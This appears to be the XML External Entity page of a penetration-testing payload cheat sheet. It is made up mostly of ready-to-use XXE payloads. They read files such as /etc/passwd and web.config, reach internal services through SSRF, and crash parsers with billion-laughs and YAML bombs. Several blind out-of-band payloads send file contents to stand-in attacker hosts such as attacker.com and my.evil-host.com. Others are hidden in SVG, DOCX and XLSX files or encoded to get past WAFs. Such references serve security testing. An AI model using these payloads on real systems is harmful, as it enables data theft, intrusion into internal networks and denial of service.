# XML External Entity

> An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.

## Tools

- [staaldraad/xxeftp](https://github.com/staaldraad/xxeserv) - A mini webserver with FTP support for XXE payloads
- [lc/230-OOB](https://github.com/lc/230-OOB) - An Out-of-Band XXE server for retrieving file contents over FTP and payload generation via [http://xxe.sh/](http://xxe.sh/)
- [enjoiz/XXEinjector](https://github.com/enjoiz/XXEinjector) - Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods
- [BuffaloWill/oxml_xxe](https://github.com/BuffaloWill/oxml_xxe) - A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)
- [whitel1st/docem](https://github.com/whitel1st/docem) - Utility to embed XXE and XSS payloads in docx,odt,pptx,etc
- [bytehope/wwe](https://github.com/bytehope/wwe) - PoC tool (based on wrapwrap & lightyear ) to demonstrate XXE in PHP with only LIBXML_DTDLOAD or LIBXML_DTDATTR flag set

## Detect The Vulnerability

**Internal Entity**: If an entity is declared within a DTD it is called an internal entity.
Syntax: `<!ENTITY entity_name "entity_value">`

**External Entity**: If an entity is declared outside a DTD it is called an external entity. Identified by `SYSTEM`.
Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`

Basic entity test, when the XML parser parses the external entities the result should contain "John" in `firstName` and "Doe" in `lastName`. Entities are defined inside the `DOCTYPE` element.

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

It might help to set the `Content-Type: application/xml` in the request when sending XML payload to the server.

These are different types of entities in XML:

| Type             | Prefix   | Where usable                |
| ---------------- | -------- | --------------------------- |
| General entity   | `&name;` | Inside XML document content |
| Parameter entity | `%name;` | Only inside the DTD         |

## Exploiting XXE to Retrieve Files

### Classic XXE

We try to display the content of the file `/etc/passwd`.

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```

:warning: `SYSTEM` and `PUBLIC` are almost synonym.

```ps1
<!ENTITY % xxe PUBLIC "Random Text" "URL">
<!ENTITY xxe PUBLIC "Any TEXT" "URL">
```

### Classic XXE Base64 Encoded

```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

### PHP Wrapper Inside XXE

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>
```

### XInclude Attacks

When you can't modify the **DOCTYPE** element use the **XInclude** to target

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## Exploiting XXE to Perform SSRF Attacks

XXE can be combined with the [SSRF vulnerability](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery) to target another service on the network.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://internal.service/secret_pass.txt" >
]>
<foo>&xxe;</foo>
```

## Exploiting XXE to Perform a Denial of Service

:warning: : These attacks might kill the service or the server, do not use them on the production.

### Billion Laugh Attack

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

### YAML Attack

```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

### Parameters Laugh Attack

A variant of the Billion Laughs attack, using delayed interpretation of parameter entities, by Sebastian Pipping.

```xml
<!DOCTYPE r [
  <!ENTITY % pe_1 "<!---->">
  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
  %pe_4;
]>
<r/>
```

## Exploiting Error Based XXE

### Error Based - Using Local DTD File

If error based exfiltration is possible, you can still rely on a local DTD to do concatenation tricks. Payload to confirm that error message include filename.

```xml
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///abcxyz/">
    %local_dtd;
]>
<root></root>
```

- [GoSecure/dtd-finder](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md) - List DTDs and generate XXE payloads using those local DTDs.

#### Linux Local DTD

Short list of DTD files already stored on Linux systems; list them with `locate .dtd`:

```xml
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/share/xml/svg/svg10.dtd
/usr/share/xml/svg/svg11.dtd
/usr/share/yelp/dtd/docbookx.dtd
```

The file `/usr/share/xml/fontconfig/fonts.dtd` has an injectable entity `%constant` at line 148: `<!ENTITY % constant 'int|double|string|matrix|bool|charset|langset|const'>`

The final payload becomes:

```xml
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % constant 'aaa)>
            <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
            <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
            &#x25;eval;
            &#x25;error;
            <!ELEMENT aa (bb'>
    %local_dtd;
]>
<message>Text</message>
```

#### Windows Local DTD

Payloads from [infosec-au/xxe-windows.md](https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79).

- Disclose local file

  ```xml
  <!DOCTYPE doc [
      <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
      <!ENTITY % SuperClass '>
          <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
          <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
          &#x25;eval;
          &#x25;error;
        <!ENTITY test "test"'
      >
      %local_dtd;
    ]><xxx>anything</xxx>
  ```

- Disclose HTTP Response

  ```xml
  <!DOCTYPE doc [
      <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
      <!ENTITY % SuperClass '>
          <!ENTITY &#x25; file SYSTEM "https://erp.company.com">
          <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">
          &#x25;eval;
          &#x25;error;
        <!ENTITY test "test"'
      >
      %local_dtd;
    ]><xxx>anything</xxx>
  ```

### Error Based - Using Remote DTD

**Payload to trigger the XXE**:

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
    %ext;
]>
<message></message>
```

**Content of ext.dtd**:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**Alternative content of ext.dtd**:

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; leak SYSTEM '%data;:///'>">
%eval;
%leak;
```

Let's break down the payload:

1. `<!ENTITY % file SYSTEM "file:///etc/passwd">`
  This line defines an external entity named file that references the content of the file /etc/passwd (a Unix-like system file containing user account details).
2. `<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">`
  This line defines an entity eval that holds another entity definition. This other entity (error) is meant to reference a nonexistent file and append the content of the file entity (the `/etc/passwd` content) to the end of the file path. The `&#x25;` is a URL-encoded '`%`' used to reference an entity inside an entity definition.
3. `%eval;`
  This line uses the eval entity, which causes the entity error to be defined.
4. `%error;`
  Finally, this line uses the error entity, which attempts to access a nonexistent file with a path that includes the content of `/etc/passwd`. Since the file doesn't exist, an error will be thrown. If the application reports back the error to the user and includes the file path in the error message, then the content of `/etc/passwd` would be disclosed as part of the error message, revealing sensitive information.

## Exploiting Blind XXE to Exfiltrate Data Out of Band

Sometimes you won't have a result outputted in the page but you can still extract the data with an out of band attack.

### Basic Blind XXE

The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator.

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
]>
<r></r>
```

```xml
<!DOCTYPE root [<!ENTITY test SYSTEM 'http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net'>]>
<root>&test;</root>
```

Send the content of `/etc/passwd` to "www.malicious.com", you may receive only the first line.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]
>
<foo>&callhome;</foo>
```

### Out of Band XXE

> Yunusov, 2013

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
<data>&send;</data>

File stored on http://publicServer.com/parameterEntity_oob.dtd
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
%all;
```

### XXE OOB with DTD and PHP Filter

```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

File stored on http://127.0.0.1/dtd.xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
```

### XXE OOB with Apache Karaf

CVE-2018-11788 affecting versions:

- Apache Karaf <= 4.2.1
- Apache Karaf <= 4.1.6

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"> %dtd;]
<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
    <feature name="deployer" version="2.0" install="auto">
    </feature>
</features>
```

Send the XML file to the `deploy` folder.

Ref. [brianwrf/CVE-2018-11788](https://github.com/brianwrf/CVE-2018-11788)

## WAF Bypasses

### Bypass via Character Encoding

XML parsers uses 4 methods to detect encoding:

- HTTP Content Type: `Content-Type: text/xml; charset=utf-8`
- Reading Byte Order Mark (BOM)
- Reading first symbols of document
    - UTF-8 (3C 3F 78 6D)
    - UTF-16BE (00 3C 00 3F)
    - UTF-16LE (3C 00 3F 00)
- XML declaration: `<?xml version="1.0" encoding="UTF-8"?>`

| Encoding | BOM      | Example                             |              |
| -------- | -------- | ----------------------------------- | ------------ |
| UTF-8    | EF BB BF | EF BB BF 3C 3F 78 6D 6C             | ...<?xml     |
| UTF-16BE | FE FF    | FE FF 00 3C 00 3F 00 78 00 6D 00 6C | ...<.?.x.m.l |
| UTF-16LE | FF FE    | FF FE 3C 00 3F 00 78 00 6D 00 6C 00 | ..<.?.x.m.l. |

**Example**: We can convert the payload to `UTF-16` using [iconv](https://man7.org/linux/man-pages/man1/iconv.1.html) to bypass some WAF:

```bash
cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
```

### XXE on JSON Endpoints

In the HTTP request try to switch the `Content-Type` from **JSON** to **XML**,

| Content Type       | Data                               |
| ------------------ | ---------------------------------- |
| `application/json` | `{"search":"name","value":"test"}` |
| `application/xml`  | `<?xml version="1.0" encoding="UTF-8" ?><root><search>name</search><value>data</value></root>` |

- XML documents must contain one root (`<root>`) element that is the parent of all other elements.
- The data must be converted to XML too, otherwise the server will respond with an error.

```json
{
  "errors":{
    "errorMessage":"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity."
  }
}
```

- [NetSPI/Content-Type Converter](https://github.com/NetSPI/Burp-Extensions/releases/tag/1.4)

## XXE in Exotic Files

### XXE Inside SVG

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls" width="200" height="200"></image>
</svg>
```

**Classic**:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**OOB via SVG rasterization**:

_xxe.svg_:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
%sp;
%param1;
]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>
```

_xxe.xml_:

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>">
```

### XXE Inside SOAP

```xml
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

### XXE Inside DOCX file

Format of an Open XML file (inject the payload in any .xml file):

- /_rels/.rels
- [Content_Types].xml
- Default Main Document Part
    - /word/document.xml
    - /ppt/presentation.xml
    - /xl/workbook.xml

Then update the file `zip -u xxe.docx [Content_Types].xml`

Tool : <https://github.com/BuffaloWill/oxml_xxe>

```xml
DOCX/XLSX/PPTX
ODT/ODG/ODP/ODS
SVG
XML
PDF (experimental)
JPG (experimental)
GIF (experimental)
```

### XXE Inside XLSX file

Structure of the XLSX:

```ps1
$ 7z l xxe.xlsx
[...]
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-10-17 15:19:00 .....          578          223  _rels/.rels
2021-10-17 15:19:00 .....          887          508  xl/workbook.xml
2021-10-17 15:19:00 .....         4451          643  xl/styles.xml
2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml
2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels
2021-10-17 15:19:00 .....          201          160  xl/sharedStrings.xml
2021-10-17 15:19:00 .....          731          352  docProps/core.xml
2021-10-17 15:19:00 .....          410          246  docProps/app.xml
2021-10-17 15:19:00 .....         1367          345  [Content_Types].xml
------------------- ----- ------------ ------------  ------------------------
2021-10-17 15:19:00              11216         3586  9 files
```

Extract Excel file: `7z x -oXXE xxe.xlsx`

Rebuild Excel file:

```ps1
cd XXE
zip -r -u ../xxe.xlsx *
```

Warning: Use `zip -u` (<https://infozip.sourceforge.net/Zip.html>) and not `7z u` / `7za u` (<https://p7zip.sourceforge.net/>) or `7zz` (<https://www.7-zip.org/>) because they won't recompress it the same way and many Excel parsing libraries will fail to recognize it as a valid Excel file. A valid  magic byte signature with (`file XXE.xlsx`) will be shown as `Microsoft Excel 2007+` (with `zip -u`) and an invalid one will be shown as `Microsoft OOXML`. Alternatively, with 7z you can specify the correct compression algorithm with: `7z a -tzip` to get the correct signature.

Add your blind XXE payload inside `xl/workbook.xml`.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
```

Alternatively, add your payload in `xl/sharedStrings.xml`:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
```

Using a remote DTD will save us the time to rebuild a document each time we want to retrieve a different file.
Instead we build the document once and then change the DTD.
And using FTP instead of HTTP allows to retrieve much larger files.

`xxe.dtd`

```xml
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
```

Serve DTD and receive FTP payload using [staaldraad/xxeserv](https://github.com/staaldraad/xxeserv):

```ps1
xxeserv -o files.log -p 2121 -w -wd public -wp 8000
```

### XXE Inside DTD file

Most XXE payloads detailed above require control over both the DTD or `DOCTYPE` block as well as the `xml` file.
In rare situations, you may only control the DTD file and won't be able to modify the `xml` file. For example, a MITM.
When all you control is the DTD file, and you do not control the `xml` file, XXE may still be possible with this payload.

```xml
<!-- Load the contents of a sensitive file into a variable -->
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!-- Use that variable to construct an HTTP get request with the file contents in the URL -->
<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://my.evil-host.com/x=%payload;">'>
%param1;
%external;
```
